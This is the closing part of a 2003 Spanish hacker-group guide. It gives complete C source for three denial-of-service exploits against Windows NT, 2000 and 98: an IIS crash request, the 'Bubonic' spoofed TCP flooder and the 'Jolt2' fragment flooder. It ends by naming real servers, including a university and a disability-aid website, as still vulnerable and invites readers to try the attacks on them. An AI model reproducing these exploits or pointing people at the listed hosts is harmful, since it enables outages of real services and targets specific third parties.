A continuacion voy a poner algunos exploits para Windows NT.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

9.1 DoS

Exploits de tipo DoS (Denial Of Service, denegacion de servicio).

IIS-DOS <=> Exploit para Win2k (Windows 2000) que produce DoS.

Programado en C por wildcoyote.

/* <==================== EMPIEZA EL CODIGO ====================================> */

/*
 
 Description: DoS against IIS and Win2000.0 Servers by wildcoyote
 Comments   : Based on a perl *script* by EvilEntity@hotmail.com
 Flamez to  : wildcoyote@gk-team.org
 
*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int openhost(char *host,int port)
{
  int sock;
  struct sockaddr_in addr;
  struct hostent *he;

  he=gethostbyname(host);

  if (he==NULL)
    {
      perror("gethostbyname()");
      exit(-1);
    }

  sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);

  if (sock==-1)
    {
      perror("socket()");
      exit(-1);
    }

  memcpy(&addr.sin_addr, he->h_addr, he->h_length);
  addr.sin_family=AF_INET;
  addr.sin_port=htons(port);

  if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
      sock=-2;
    }

  return sock;
}

void sends(int sock,char *buf)
{
  write(sock,buf,strlen(buf));
}

void DoS(char *host, int port)
{
  int sock,i,file_buf_size;
  char *buf, file_read[256],valid_file[256];
  printf("\nDoS against IIS and Win2000.0 Servers by wildcoyote\n\n");
  printf("File to read: ");
  scanf("%s",&file_read);
  printf("Enter Valid file: ");
  scanf("%s",&valid_file);
  file_buf_size=strlen(valid_file);
  printf("Trying to connect to %s (%d)....(please wait)\n",host,port);
  sock=openhost(host,port);
  if(sock<=0)
    {
      printf("- Could not connect -\n");
      printf("Exiting...\n\n");
      exit(-1);
    }
  else printf("Connected to %s (%d)\n",host,port);
  printf("Allocating memory for DoS\n");
  buf = (char *) malloc(2500); // bah! =) whatever...
  sprintf(buf,"GET %s",valid_file);
  for(i=0;i<file_buf_size;i++) strcat(buf,"%20");
  strcat(buf,".htw?CiWebHitsFile=");
  strcat(buf,file_read);
  strcat(buf,"&CiRestriction=none&CiHiliteType=Full HTTP/1.0\n\n");
  printf("Oh k! Sending CRASH!\n");
  sends(sock,buf);
  close(sock);
  free(buf);
  printf("Crash sent! The host *probably* crashed :P\n");
  printf("Send flamez to wildcoyote@gk-team.org, *Enjoy*...\n\n");
}

main(int argc, char *argv[])
{
  int sock,i;
  if (argc<2)
    {
      printf("\nDoS against IIS and Win2000.0 Servers by wildcoyote\n\n");
      printf("Sintaxe: %s <host> [port - default 80]\n",argv[0]);
      printf("Send flamez to wildcoyote@gk-team.org, *Enjoy*...\n\n");
    }
  else if (argc==2) DoS(argv[1],80);
  else DoS(argv[1],atoi(argv[2]));
}
/* compilacion: gcc -o ./exploitdos xploitdos.c          [14 June 2000]*/

/* <==================== TERMINA EL CODIGo ====================================> */



Bubonic <=> Exploit DoS para Windows 2k.

Programado en C .

/* <==================== EMPIEZA EL CODIGO ====================================> */

/*
 * Bubonic.c lame DoS against Windows 2000 machines
 * and certain versions of Linux (worked against an Ultra5
 * running Redhat Zoot. Should compile under anything.
 * Randomly sends TCP packets with random settings, etc.
 *
 * Brings the load up causing the box to crash with
 * error code:
 *
 * STOP 0x00000041 (0x00001000,0x00001279,0x000042A,0x00000001)
 * MUST_SUCCEED_POOL_EMPTY
 *
 * CODE RIPPED FROM MY OTHER BGP KILLER WITH SETTINGS TWEAKED.
 * WEE MULTICODE... www.antioffline.com/daemonic.c
 *
 * shouts... hrmm fsck it why not...
 * #unixgods on the efnet, jhh, iggie, rajak, speye, obecian,
 * qwer7y, m3th, god-, tattooman, spikeman, and my wife.
 * Can't forget security staff all over the place.
 *
 * Logs for the packets sent at www.antioffline.com/logged
 * Windows2K screen shots at www.antioffline.com/loads.html
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#ifndef __USE_BSD
#define __USE_BSD

#endif

#ifndef __FAVOR_BSD

#define __FAVOR_BSD

#endif

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x)  htons(x)

#else

#define FIX(x)  (x)
#endif

struct ip_hdr {
    u_int       ip_hl:4,                
                ip_v:4;                 
    u_char      ip_tos;                 
    u_short     ip_len;                 
    u_short     ip_id;                  
    u_short     ip_off;                 
    u_char      ip_ttl;                 
    u_char      ip_p;                   
    u_short     ip_sum;                 
    u_long      saddr, daddr;           
};

struct tcp_hdr {
    u_short     th_sport;               
    u_short     th_dport;               
    u_long      th_seq;                 
    u_long      th_syn;
    u_int       th_x2:4,
                th_off:4;
    u_char      th_flags;               
    u_short     th_win;                 
    u_short     th_sum;                 
    u_short     th_urp;                 
};

struct tcpopt_hdr {
    u_char  type;                       
    u_char  len;                        
    u_short value;                      
};

struct pseudo_hdr {                     
    u_long saddr, daddr;                
    u_char mbz, ptcl;                   
    u_short tcpl;                       
};

struct packet {
    struct ip/*_hdr*/ ip;
    struct tcphdr tcp;
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short bgport, bgsize, pps;
u_long radd;
u_long sradd;
int sock;

void usage(char *progname)
{
    fprintf(stderr, "Usage: %s <dst> <src> <size> <number>\n", progname);
    fprintf(stderr, "Ports are set to send and receive on port 179\n");
    fprintf(stderr, "dst:\tDestination Address\n");
    fprintf(stderr, "src:\tSource Address\n");
    fprintf(stderr, "size:\tSize of packet which should be no larger than 1024 should allow for xtra header info thru routes\n");
    fprintf(stderr, "num:\tpackets\n\n");
    exit(1);
}

inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
     while (nleft > 1)  {
         sum += *w++;
         nleft -= 2;
     }
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);               
     answer = ~sum;                  
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s fucknut\n", hostname);
       exit(1);
    }

    return *(u_long *)hp->h_addr;
}


void flooder(void)
{
    struct timespec ts;
    int i;


    memset(&packet, 0, sizeof(packet));

    ts.tv_sec                   = 0;
    ts.tv_nsec                  = 10;

    packet.ip.ip_hl             = 5;
    packet.ip.ip_v              = 4;
    packet.ip.ip_p              = IPPROTO_TCP;
    packet.ip.ip_tos            = rand();
    packet.ip.ip_id             = radd;
    packet.ip.ip_len            = FIX(sizeof(packet));
    packet.ip.ip_off            = 0;
    packet.ip.ip_ttl            = 255;
    packet.ip.ip_dst.s_addr     = radd;

    packet.tcp.th_flags         = random();
    packet.tcp.th_win           = 65535;
    packet.tcp.th_seq           = random();
    packet.tcp.th_ack           = 0;
    packet.tcp.th_off           = 0; 
    packet.tcp.th_urp           = random();
    packet.tcp.th_dport         = random();
    cksum.pseudo.daddr          = sradd;
    cksum.pseudo.mbz            = 0;
    cksum.pseudo.ptcl           = IPPROTO_TCP;
    cksum.pseudo.tcpl           = random();

    s_in.sin_family             = AF_INET;
    s_in.sin_addr.s_addr        = sradd;
    s_in.sin_port               = packet.tcp.th_dport;

    for(i=0;;++i) {
    if( !(i&0x3FF) ) {
        packet.tcp.th_sport = rand();
        cksum.pseudo.saddr = packet.ip.ip_src.s_addr = sradd;
        packet.tcp.th_flags = random();
        packet.tcp.th_ack   = rand();

    }
    else {
        packet.tcp.th_flags = rand();
        packet.tcp.th_ack = rand();
    }
       ++packet.ip.ip_id;
       /*++packet.tcp.th_sport*/;
       ++packet.tcp.th_seq;

       if (!bgport)
          s_in.sin_port = packet.tcp.th_dport = rand();

       packet.ip.ip_sum         = 0;
       packet.tcp.th_sum        = 0;

       cksum.tcp                = packet.tcp;

       packet.ip.ip_sum         = in_cksum((void *)&packet.ip, 20);
       packet.tcp.th_sum        = in_cksum((void *)&cksum, sizeof(cksum));

       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in)) < 0);

    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("Bubonic -- sil@antioffline.com\n\n");

    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket");
       exit(1);
    }

    setgid(getgid()); setuid(getuid());

    if (argc < 4)
       usage(argv[0]);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)

{
       perror("setsockopt");
       exit(1);

    }

    srand((time(NULL) ^ getpid()) + getppid());

    printf("\nFinding host\n"); fflush(stdout);

    radd        = lookup(argv[1]);
    bgport      = atoi(argv[3]);
    bgsize      = atoi(argv[4]);
    sradd	= lookup(argv[2]);
    printf("AntiOffline -- Putting the Hero in Heroin\n");

    flooder();

    return 0;
}
/*                    www.hack.co.za           [28 August 2000]*/

/* <==================== TERMINA EL CODIGo ====================================> */



Jolt2  <=> Exploit para Windows 98/NT4.0/2000 que produce DoS.

Programado en C por Phonix

/* <==================== EMPIEZA EL CODIGo ====================================> */

/*
 * File:   jolt2.c
 * Author: Phonix <phonix@moocow.org>
 * Date:   23-May-00
 *
 * Description: This is the proof-of-concept code for the
 *              Windows denial-of-serice attack described by
 *              the Razor team (NTBugtraq, 19-May-00)
 *              (MS00-029).  This code causes cpu utilization
 *              to go to 100%.
 *
 * Tested against: Win98; NT4/SP5,6; Win2K
 *
 * Written for: My Linux box.  YMMV.  Deal with it.
 *
 * Thanks: This is standard code.  Ripped from lots of places.
 *         Insert your name here if you think you wrote some of
 *         it.  It's a trivial exploit, so I won't take credit
 *         for anything except putting this file together.
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <getopt.h>

struct _pkt
  {
    struct iphdr    ip;
    union {
        struct icmphdr  icmp;
        struct udphdr   udp;
      }  proto;
    char data;
  }
pkt;

int icmplen  = sizeof(struct icmphdr),
               udplen   = sizeof(struct udphdr),
                          iplen    = sizeof(struct iphdr),
                                     spf_sck;

void usage(char *pname)
{
  fprintf (stderr, "Usage: %s [-s src_addr] [-p port] dest_addr\n",
           pname);
  fprintf (stderr, "Note: UDP used if a port is specified, otherwise ICMP\n");
  exit(0);
}

u_long host_to_ip(char *host_name)
{
  static  u_long ip_bytes;
  struct hostent *res;

  res = gethostbyname(host_name);
  if (res == NULL)
    return (0);
  memcpy(&ip_bytes, res->h_addr, res->h_length);
  return (ip_bytes);
}

void quit(char *reason)
{
  perror(reason);
  close(spf_sck);
  exit(-1);
}

int do_frags (int sck, u_long src_addr, u_long dst_addr, int port)
{
  int     bs, psize;
  unsigned long x;
  struct  sockaddr_in to;

  to.sin_family = AF_INET;
  to.sin_port = 1235;
  to.sin_addr.s_addr = dst_addr;

  if (port)
    psize = iplen + udplen + 1;
  else
    psize = iplen + icmplen + 1;
  memset(&pkt, 0, psize);

  pkt.ip.version = 4;
  pkt.ip.ihl = 5;
  pkt.ip.tot_len = htons(iplen + icmplen) + 40;
  pkt.ip.id = htons(0x455);
  pkt.ip.ttl = 255;
  pkt.ip.protocol = (port ? IPPROTO_UDP : IPPROTO_ICMP);
  pkt.ip.saddr = src_addr;
  pkt.ip.daddr = dst_addr;
  pkt.ip.frag_off = htons (8190);

  if (port)
    {
      pkt.proto.udp.source = htons(port|1235);
      pkt.proto.udp.dest = htons(port);
      pkt.proto.udp.len = htons(9);
      pkt.data = 'a';
    }
  else
    {
      pkt.proto.icmp.type = ICMP_ECHO;
      pkt.proto.icmp.code = 0;
      pkt.proto.icmp.checksum = 0;
    }

  while (1)
    {
      bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
                  sizeof(struct sockaddr));
    }
  return bs;
}

int main(int argc, char *argv[])
{
  u_long  src_addr, dst_addr;
  int i, bs=1, port=0;
  char hostname[32];

  if (argc < 2)
    usage (argv[0]);

  gethostname (hostname, 32);
  src_addr = host_to_ip(hostname);

  while ((i = getopt (argc, argv, "s:p:h")) != EOF)
    {
      switch (i)
        {
        case 's':
          dst_addr = host_to_ip(optarg);
          if (!dst_addr)
            quit("Bad source address given.");
          break;

        case 'p':
          port = atoi(optarg);
          if ((port <=0) || (port > 65535))
            quit ("Invalid port number given.");
          break;

        case 'h':
        default:
          usage (argv[0]);
        }
    }

  dst_addr = host_to_ip(argv[argc-1]);
  if (!dst_addr)
    quit("Bad destination address given.");

  spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (!spf_sck)
    quit("socket()");
  if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *)&bs,
                 sizeof(bs)) < 0)
    quit("IP_HDRINCL");

  do_frags (spf_sck, src_addr, dst_addr, port);
}
/*                    www.hack.co.za           [8 June 2000]*/

/* <==================== TERMINA EL CODIGo ====================================> */

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

10.0 Despedida

Bueno, sin mas qué decir, espero qué hayan aprendido el peligro qué se corre al usar
sistemas NT.
Quiero aclarar qué muchos bugs quedaron en el tintero, pero mas adelante los voy a publicar, solo puse los más conocidos.

Sí te leiste todo el documento tendras ganas de explorar y ver cómo actua esto, así qué aca teneis unos servidores vulnerables :

 www.ucu.edu.uy <- Universidad Catolica de Uruguay, fue avisado al administrador el  19/9, hoy estámos en octubre y todavia persiste el bug.

 www.feapsmadrid.org <- Web de ayuda a discapacitados, fue avisado al administrador el  1/9 y todavia persiste el bug.

 213.97.100.202 <- Web marroquí, fue avisado al administrador pero parece qué no  entiende castellano xDDD.


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

-----------------------------------------------------------------------------
                   DisidentS Hacker Team 2003 (c).
 
----------------------------------------------------------------------------
                 Mail del Team: disidents@yahoo.es
----------------------------------------------------------------------------
 
                               0
                             X0 0X
                               S